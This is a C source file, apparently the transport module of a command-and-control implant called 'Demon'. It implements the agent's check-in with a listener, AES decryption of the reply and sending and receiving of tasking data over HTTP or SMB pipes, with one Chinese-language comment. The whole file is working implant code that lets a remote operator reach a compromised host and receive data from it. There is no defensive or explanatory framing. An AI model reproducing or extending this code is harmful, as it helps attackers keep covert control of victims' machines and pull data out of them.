#include <Demon.h>

#include <Common/Macros.h>

#include <Core/Package.h>
#include <Core/Transport.h>
#include <Core/MiniStd.h>
#include <Core/TransportHttp.h>
#include <Core/TransportSmb.h>

#include <Crypt/AesCrypt.h>

// 发送上线信息，返回AgentID，与当前一致，说明连接成功
BOOL TransportInit( )
{
    PUTS( "Connecting to listener" )
    PVOID  Data    = NULL;
    SIZE_T Size    = 0;
    BOOL   Success = FALSE;

    /* Sends to our connection (direct/pivot) */
#ifdef TRANSPORT_HTTP
    if ( PackageTransmit( Instance.MetaData, &Data, &Size ) )
    {
        AESCTX AesCtx = { 0 };

        /* Decrypt what we got */
        AesInit( &AesCtx, Instance.Config.AES.Key, Instance.Config.AES.IV );
        AesXCryptBuffer( &AesCtx, Data, Size );

        if ( Data )
        {
            if ( ( UINT32 ) Instance.Session.AgentID == ( UINT32 ) DEREF( Data ) )
            {
                Instance.Session.Connected = TRUE;
                Success = TRUE;
            }
        }
    }
#endif

#ifdef TRANSPORT_SMB
    if ( PackageTransmit( Instance.MetaData, NULL, NULL ) == TRUE )
    {
        Instance.Session.Connected = TRUE;
        Success = TRUE;
    }
#endif

    return Success;
}

BOOL TransportSend( LPVOID Data, SIZE_T Size, PVOID* RecvData, PSIZE_T RecvSize )
{
    BUFFER Send = { 0 };
    BUFFER Resp = { 0 };

    Send.Buffer = Data;
    Send.Length = Size;

#ifdef TRANSPORT_HTTP

    if ( HttpSend( &Send, &Resp ) )
    {
        if ( RecvData )
            *RecvData = Resp.Buffer;

        if ( RecvSize )
            *RecvSize = Resp.Length;

        return TRUE;
    }

#endif

#ifdef TRANSPORT_SMB

    if ( SmbSend( &Send ) )
    {
        if ( SmbRecv( &Resp ) )
        {
            if ( RecvData )
                *RecvData = Resp.Buffer;

            if ( RecvSize )
                *RecvSize = Resp.Length;

            return TRUE;
        }
    }

#endif

    return FALSE;
}

